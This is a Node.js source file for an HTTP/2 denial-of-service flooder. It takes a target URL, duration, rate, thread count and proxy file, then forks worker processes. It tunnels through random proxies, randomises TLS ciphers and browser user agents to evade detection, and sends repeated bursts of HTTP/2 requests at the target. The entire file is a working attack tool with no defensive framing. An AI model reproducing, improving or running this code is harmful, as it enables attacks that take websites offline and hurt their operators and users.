const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
 const os = require("os");

const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7) {
  console.log('node tls target time rate thread proxy'.rainbow);
  process.exit();
}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();

 const ip_spoof3 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 118);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed3 = ip_spoof3();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 }



 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-RSA-AES128-SHA",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-SHA",
  "TLS_AES_128_GCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
 ];
const val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}),
            }
 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = ['he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5', 'nl-NL,nl;q=0.9', 'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'pl-PL,pl;q=0.9', 'pt-BR,pt;q=0.9', 'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9', 'ru-RU,ru;q=0.9', 'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', 'sv-SE,sv;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9', 'uk-UA,uk;q=0.9', 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', 'vi-VN,vi;q=0.9', 'zh-CN,zh;q=0.9', 'zh-HK,zh;q=0.9', 'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8', 'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', 'bn-BD,bn;q=0.8', 'bs-Cyrl-BA,bs;q=0.8', 'bs-Latn-BA,bs;q=0.8', 'dz-BT,dz;q=0.8', 'fil-PH,fil;q=0.8', 'fr-CA,fr;q=0.8', 'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8', 'ha-Latn-NG,ha;q=0.8', 'hr-BA,hr;q=0.8', 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8', 'is-IS,is;q=0.8', 'jv-Latn-ID,jv;q=0.8', 'ka-GE,ka;q=0.8', 'kkj-CM,kkj;q=0.8', 'kl-GL,kl;q=0.8', 'km-KH,km;q=0.8', 'kok-IN,kok;q=0.8', 'ks-Arab-IN,ks;q=0.8', 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'mr-MN,mr;q=0.8', 'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', 'mua-CM,mua;q=0.8', 'nds-DE,nds;q=0.8', 'ne-IN,ne;q=0.8', 'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', 'pa-Arab-PK,pa;q=0.8', 'ps-AF,ps;q=0.8', 'quz-BO,quz;q=0.8', 'quz-EC,quz;q=0.8', 'quz-PE,quz;q=0.8', 'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8', 'se-NO,se;q=0.8', 'si-LK,si;q=0.8', 'smn-FI,smn;q=0.8', 'sms-FI,sms;q=0.8', 'syr-SY,syr;q=0.8', 'tg-Cyrl-TJ,tg;q=0.8', 'ti-ER,ti;q=0.8', 'tk-TM,tk;q=0.8', 'tn-ZA,tn;q=0.8', 'tt-RU,tt;q=0.8', 'ug-CN,ug;q=0.8', 'uz-Cyrl-UZ,uz;q=0.8', 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8', 'xh-ZA,xh;q=0.8', 'yo-NG,yo;q=0.8', 'zgh-MA,zgh;q=0.8', 'zu-ZA,zu;q=0.8',];
 
 const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 const uap = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var accept = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);


const MAX_RAM_PERCENTAGE = 65;
const RESTART_DELAY = 1000;
const KillScript = () => process.exit(1);
 
setTimeout(KillScript, args.time * 1000);
 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
 async HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = await net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 const Socker = new NetSocket();
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path + "?q=" + accept;
  headers[":scheme"] = "https";
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = uap1
  
  function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers["user-agent"] = uap1;
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host,
         timeout: 50,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "prime256v1:secp384r1",
            ciphers: cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            ALPNProtocols: ['h2'],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_TLSv1 |
                           crypto.constants.SSL_OP_NO_TLSv1_1,
        };

         const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = await http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456 * 10,
            maxHeaderListSize: 262144 * 10,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456 * 10,
            maxHeaderListSize: 262144 * 10,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
				//console.log(shuffledHeaders);
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    client.on("response", response => {
						//console.log(request.headers[":status"]);
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 600);
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript2 = () => process.exit(1);
 
 setTimeout(KillScript2, args.time * 1000);